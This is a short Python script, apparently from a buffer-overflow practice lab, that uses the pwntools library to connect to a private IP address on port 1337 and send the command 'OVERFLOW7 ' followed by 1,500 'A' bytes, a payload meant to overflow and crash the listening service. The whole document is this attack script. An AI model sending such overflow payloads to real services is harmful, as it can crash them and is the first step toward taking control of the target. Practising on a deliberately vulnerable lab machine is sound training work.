#!/usr/bin/env python3

from pwn import *

host = "10.10.207.155"
port = 1337

s = remote(host, port)
total_length = 1500

payload = [
    b"OVERFLOW7 ",
    b"A" * total_length,
]

payload = b"".join(payload)
s.send(payload)
s.close()